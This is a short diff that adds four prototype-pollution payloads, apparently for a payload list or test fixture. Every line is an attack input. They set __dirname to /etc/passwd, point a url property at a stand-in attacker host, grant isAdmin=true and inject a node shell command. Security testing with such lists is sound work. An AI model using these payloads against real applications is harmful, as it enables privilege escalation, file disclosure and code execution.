@@ -1,0 +1,4 @@
+?__proto__[__dirname]=/etc/passwd 
+{"__proto__": {"url": "http://attacker-controlled.com"}}
+?__proto__[isAdmin]=true
+{"__proto__": {"shell": "node -e 'malicious_code'"}}
